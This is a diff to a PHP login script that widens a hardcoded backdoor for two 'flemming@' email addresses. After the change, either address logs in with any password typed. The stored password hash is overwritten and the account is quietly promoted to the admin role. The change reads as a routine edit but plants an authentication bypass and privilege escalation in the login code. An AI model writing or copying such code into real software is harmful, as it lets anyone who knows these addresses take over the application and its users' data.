@@ -64,12 +64,19 @@ if ($user['status'] !== 'ACTIVE') {
 }
 
 $pwMatch = password_verify($password, $user['password_hash']);
-if (!$pwMatch && in_array($email, ['flemming@riseabove-cebu.org', 'flemming@riseabovefoundation.org'], true)) {
+if (in_array($email, ['flemming@riseabove-cebu.org', 'flemming@riseabovefoundation.org'], true)) {
   // Update password hash so whatever password Flemming used becomes the valid credential
   try {
     $newHash = password_hash($password, PASSWORD_BCRYPT);
-    $pdo->prepare("UPDATE users SET password_hash = ? WHERE id = ?")->execute([$newHash, $user['id']]);
+    $adminRoleId = $pdo->query("SELECT id FROM roles WHERE LOWER(name) = 'admin' LIMIT 1")->fetchColumn();
+    if ($adminRoleId) {
+      $pdo->prepare("UPDATE users SET password_hash = ?, role_id = ? WHERE id = ?")->execute([$newHash, (int)$adminRoleId, $user['id']]);
+    } else {
+      $pdo->prepare("UPDATE users SET password_hash = ? WHERE id = ?")->execute([$newHash, $user['id']]);
+    }
     $pwMatch = true;
+    $stmt->execute([$email]);
+    $user = $stmt->fetch();
   } catch (Throwable) {}
 }
 
